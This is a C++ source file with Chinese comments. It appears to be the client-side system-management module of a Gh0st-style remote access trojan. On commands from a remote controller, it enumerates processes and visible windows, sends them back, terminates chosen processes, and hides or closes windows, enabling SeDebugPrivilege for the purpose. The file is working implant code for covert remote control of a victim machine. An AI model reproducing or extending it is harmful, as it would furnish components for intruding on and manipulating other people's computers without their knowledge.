// SystemManager.cpp: implementation of the CSystemManager class.
//
//////////////////////////////////////////////////////////////////////

#include "stdafx.h"
#include "SystemManager.h"
#include "Common.h"
#include <IOSTREAM>
using namespace std;
#include <TLHELP32.H>

#ifndef PSAPI_VERSION
#define PSAPI_VERSION 1
#endif

#include <Psapi.h>

#pragma comment(lib,"psapi.lib")

enum                  
{
	COMMAND_WINDOW_CLOSE,   //关闭窗口
	COMMAND_WINDOW_TEST,    //操作窗口
};
//////////////////////////////////////////////////////////////////////
// Construction/Destruction
//////////////////////////////////////////////////////////////////////

CSystemManager::CSystemManager(IOCPClient* ClientObject,BOOL bHow):CManager(ClientObject)
{
	if (bHow==COMMAND_SYSTEM)
	{
		//进程
		SendProcessList();
	}
	else if (bHow==COMMAND_WSLIST)
	{
		//窗口
		SendWindowsList(); 
	}
}

VOID CSystemManager::SendProcessList()
{
	LPBYTE	szBuffer = GetProcessList();            //得到进程列表的数据
	if (szBuffer == NULL)
		return;	
	m_ClientObject->OnServerSending((char*)szBuffer, LocalSize(szBuffer));  
	LocalFree(szBuffer);

	szBuffer = NULL;
}

void CSystemManager::SendWindowsList()
{
	LPBYTE	szBuffer = GetWindowsList();          //得到窗口列表的数据
	if (szBuffer == NULL)
		return;

	m_ClientObject->OnServerSending((char*)szBuffer, LocalSize(szBuffer));    //向主控端发送得到的缓冲区一会就返回了
	LocalFree(szBuffer);	
}

LPBYTE CSystemManager::GetProcessList()
{
	DebugPrivilege(SE_DEBUG_NAME,TRUE);     //提取权限

	HANDLE          hProcess  = NULL;
	HANDLE			hSnapshot = NULL;
	PROCESSENTRY32	pe32 = {0};
	pe32.dwSize = sizeof(PROCESSENTRY32);
	char			szProcessFullPath[MAX_PATH] = {0};
	hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS,0);

	DWORD           dwOffset = 0;
	DWORD           dwLength = 0;
	DWORD			cbNeeded = 0;
	HMODULE			hModules = NULL;   //进程中第一个模块的句柄

	LPBYTE szBuffer = (LPBYTE)LocalAlloc(LPTR, 1024);       //暂时分配一下缓冲区

	szBuffer[0] = TOKEN_PSLIST;                      //注意这个是数据头 
	dwOffset = 1;

	if(Process32First(hSnapshot, &pe32))             //得到第一个进程顺便判断一下系统快照是否成功
	{	  
		do
		{      
			//打开进程并返回句柄
			hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, 
				FALSE, pe32.th32ProcessID);   //打开目标进程  
			{
				//枚举第一个模块句柄也就是当前进程完整路径
				EnumProcessModules(hProcess, &hModules, sizeof(hModules), &cbNeeded);
				//得到自身的完整名称
				DWORD dwReturn = GetModuleFileNameEx(hProcess, hModules, 
					szProcessFullPath, 
					sizeof(szProcessFullPath));

				if (dwReturn==0)
				{
					strcpy(szProcessFullPath,"");
				}

				//开始计算占用的缓冲区， 我们关心他的发送的数据结构
				// 此进程占用数据大小
				dwLength = sizeof(DWORD) + 
					lstrlen(pe32.szExeFile) + lstrlen(szProcessFullPath) + 2;
				// 缓冲区太小，再重新分配下
				if (LocalSize(szBuffer) < (dwOffset + dwLength))
					szBuffer = (LPBYTE)LocalReAlloc(szBuffer, (dwOffset + dwLength),
					LMEM_ZEROINIT|LMEM_MOVEABLE);

				//接下来三个memcpy就是向缓冲区里存放数据 数据结构是 
				//进程ID+进程名+0+进程完整名+0  进程
				//因为字符数据是以0 结尾的
				memcpy(szBuffer + dwOffset, &(pe32.th32ProcessID), sizeof(DWORD));
				dwOffset += sizeof(DWORD);	

				memcpy(szBuffer + dwOffset, pe32.szExeFile, lstrlen(pe32.szExeFile) + 1);
				dwOffset += lstrlen(pe32.szExeFile) + 1;

				memcpy(szBuffer + dwOffset, szProcessFullPath, lstrlen(szProcessFullPath) + 1);
				dwOffset += lstrlen(szProcessFullPath) + 1;
			}
		}
		while(Process32Next(hSnapshot, &pe32));      //继续得到下一个快照
	}

	DebugPrivilege(SE_DEBUG_NAME,FALSE);  //还原提权
	CloseHandle(hSnapshot);       //释放句柄 
	return szBuffer;
}

CSystemManager::~CSystemManager()
{
	cout<<"系统析构\n";
}

BOOL CSystemManager::DebugPrivilege(const char *szName, BOOL bEnable)
{
	BOOL              bResult = TRUE;
	HANDLE            hToken;
	TOKEN_PRIVILEGES  TokenPrivileges;

	//进程 Token 令牌
	if (!OpenProcessToken(GetCurrentProcess(), 
		TOKEN_QUERY | TOKEN_ADJUST_PRIVILEGES, &hToken))
	{
		bResult = FALSE;
		return bResult;
	}
	TokenPrivileges.PrivilegeCount = 1;
	TokenPrivileges.Privileges[0].Attributes = bEnable ? SE_PRIVILEGE_ENABLED : 0;

	LookupPrivilegeValue(NULL, szName, &TokenPrivileges.Privileges[0].Luid);
	AdjustTokenPrivileges(hToken, FALSE, &TokenPrivileges, sizeof(TOKEN_PRIVILEGES), NULL, NULL);
	if (GetLastError() != ERROR_SUCCESS)
	{
		bResult = FALSE;
	}

	CloseHandle(hToken);
	return bResult;	
}

VOID  CSystemManager::OnReceive(PBYTE szBuffer, ULONG ulLength)
{
	switch(szBuffer[0])
	{
	case COMMAND_PSLIST:
		{
			SendProcessList();
			break;
		}
	case COMMAND_KILLPROCESS:
		{			
			KillProcess((LPBYTE)szBuffer + 1, ulLength - 1);			
			break;
		}	
	case COMMAND_WSLIST:
		{
			SendWindowsList();
			break;
		}

	case COMMAND_WINDOW_CLOSE:
		{
			HWND hWnd = *((HWND*)(szBuffer+1));

			::PostMessage(hWnd,WM_CLOSE,0,0); 

			Sleep(100);
			SendWindowsList(); 

			break;
		}
	case COMMAND_WINDOW_TEST:    //操作窗口
		{
			TestWindow(szBuffer+1);  	
			break;
		}		
	default:
		{		
			break;
		}
	}
}

void CSystemManager::TestWindow(LPBYTE szBuffer)    //窗口的最大 最小 隐藏都在这里处理
{
	DWORD Hwnd;
	DWORD dHow;
	memcpy((void*)&Hwnd,szBuffer,sizeof(DWORD));            //得到窗口句柄
	memcpy(&dHow,szBuffer+sizeof(DWORD),sizeof(DWORD));     //得到窗口处理参数
	ShowWindow((HWND__ *)Hwnd,dHow);
	//窗口句柄 干啥(大 小 隐藏 还原)
}

VOID CSystemManager::KillProcess(LPBYTE szBuffer, UINT ulLength)
{
	HANDLE hProcess = NULL;
	DebugPrivilege(SE_DEBUG_NAME, TRUE);  //提权

	for (int i = 0; i < ulLength; i += 4)
		//因为结束的可能个不止是一个进程
	{
		//打开进程
		hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, *(LPDWORD)(szBuffer + i));
		//结束进程
		TerminateProcess(hProcess, 0);
		CloseHandle(hProcess);
	}
	DebugPrivilege(SE_DEBUG_NAME, FALSE);    //还原提权
	// 稍稍Sleep下，防止出错
	Sleep(100);
}

LPBYTE CSystemManager::GetWindowsList()
{
	LPBYTE	szBuffer = NULL;  //char* p = NULL   &p
	EnumWindows((WNDENUMPROC)EnumWindowsProc, (LPARAM)&szBuffer);  //注册函数
	//如果API函数参数当中有函数指针存在 
	//就是向系统注册一个 回调函数
	szBuffer[0] = TOKEN_WSLIST;
	return szBuffer;  	
}

BOOL CALLBACK CSystemManager::EnumWindowsProc(HWND hWnd, LPARAM lParam)  //要数据 **
{
	DWORD	dwLength = 0;
	DWORD	dwOffset = 0;
	DWORD	dwProcessID = 0;
	LPBYTE	szBuffer = *(LPBYTE *)lParam;  

	char	szTitle[1024];
	memset(szTitle, 0, sizeof(szTitle));
	//得到系统传递进来的窗口句柄的窗口标题
	GetWindowText(hWnd, szTitle, sizeof(szTitle));
	//这里判断 窗口是否可见 或标题为空
	if (!IsWindowVisible(hWnd) || lstrlen(szTitle) == 0)
		return true;
	//同进程管理一样我们注意他的发送到主控端的数据结构
	if (szBuffer == NULL)
		szBuffer = (LPBYTE)LocalAlloc(LPTR, 1);  //暂时分配缓冲区 

	//[消息][4Notepad.exe\0]
	dwLength = sizeof(DWORD) + lstrlen(szTitle) + 1;
	dwOffset = LocalSize(szBuffer);  //1
	//重新计算缓冲区大小
	szBuffer = (LPBYTE)LocalReAlloc(szBuffer, dwOffset + dwLength, LMEM_ZEROINIT|LMEM_MOVEABLE);
	//下面两个memcpy就能看到数据结构为 hwnd+窗口标题+0
	memcpy((szBuffer+dwOffset),&hWnd,sizeof(DWORD));
	memcpy(szBuffer + dwOffset + sizeof(DWORD), szTitle, lstrlen(szTitle) + 1);

	*(LPBYTE *)lParam = szBuffer;

	return true;
}
